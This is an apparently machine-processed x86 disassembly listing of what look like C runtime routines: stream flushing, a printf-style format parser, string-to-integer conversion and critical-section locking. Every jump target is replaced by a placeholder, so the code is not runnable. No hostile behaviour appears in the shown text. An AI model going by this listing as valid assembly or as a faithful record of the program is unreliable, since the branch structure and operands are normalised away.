retn
push 0x5
pop ecx
int 0x29
sub_41174f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_412f82
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_411550
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_411550
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_412991
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_4141f0
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
dec eax
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_418172
pop ecx
test eax eax
jne r-xdata
call sub_412991
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp + 0x8 ]
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_4141f0
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_4181c6
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_41313d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_41189c
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test esi esi
je r-xdata
pop esi
xor eax eax
cmp [ ebp - 0x1c ] eax
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_41174f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_41174f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_411995
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
pop ebp
retn
call sub_411550
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_41820c
call sub_41189c
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_411550
mov [ eax ] 0x22
jmp r-xdata
call sub_411714
or eax 0xffffffff
sub_411a0c
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x450 ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x430 ] eax
call sub_40f858
call sub_411550
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
cmp [ ebp - 0x444 ] bl
je r-xdata
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x448 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_412608 ]
mov edi [ ebp - 0x434 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
sar eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x7
ja r-xdata
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_412628
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x440 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_40e8f2
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_41268a
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_41265e
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x450 ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_418e60
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x45c ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x450 ]
movzx eax al
push ecx
push eax
call sub_41602d
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_418ffa
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_41268a
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_41265e
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_41100b
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_410750
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_41265e
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x45c ]
call sub_412628
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_419110
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x45c ]
push ecx
push eax
call sub_418ffa
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_412628
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_418e75
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
sub_41265e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_412628
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_41268a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_412628
mov eax [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x2
add esp 0xc
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_412628
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_412703
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
xor eax eax
leave
retn
push ebx
push esi
push edi
movzx edi [ ecx ]
xor ebx ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp eax 0x2
jl r-xdata
push 0x8
push edi
call sub_4191a5
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jg r-xdata
movzx edi [ esi ]
add esi 0x2
mov eax [ ebp + 0x14 ]
cmp di 0x2d
jne r-xdata
cmp di 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
movzx edi [ esi ]
add esi 0x2
cmp eax 0x10
jne r-xdata
push edi
call sub_4191f7
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
push edi
call sub_4191f7
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
cmp edx ecx
jae r-xdata
push 0x41
pop eax
cmp ax di
ja r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x10 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp ebx edi
jb r-xdata
push 0x19
lea eax [ edi - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp di 0x5a
jbe r-xdata
movzx edi [ esi + 0x2 ]
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
test al 0x4
jne r-xdata
test edi edi
je r-xdata
imul ebx ecx
add ebx edx
jne r-xdata
lea eax [ edi - 0x61 ]
movzx edx di
cmp ax cx
ja r-xdata
mov eax [ ebp - 0x4 ]
push 0x19
pop ecx
call sub_411550
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
je r-xdata
test al 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push edi
call sub_4191f7
mov edx eax
pop ecx
cmp edx 0xffffffff
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x4
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
cmp edx [ ebp - 0xc ]
jbe r-xdata
add edx 0xffffffc9
sub edx 0x20
push 0x0
test al 0x2
pop ebx
setne bl
add ebx 0x7fffffff
or ebx 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
mov ecx eax
and ecx 0x2
je r-xdata
sub esi 0x2
test al 0x8
jne r-xdata
jmp r-xdata
test al 0x2
je r-xdata
mov [ edi ] esi
test ecx ecx
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
movzx edi [ esi ]
add esi 0x2
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
neg ebx
cmp ebx 0x7fffffff
jbe r-xdata
sub_4128f7
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_410fc1
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_410fc1
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_412997
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4162e1
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4129d6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_4162e1
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_412a06
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_416445
pop ecx
pop ebp
retn
sub_412a40
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
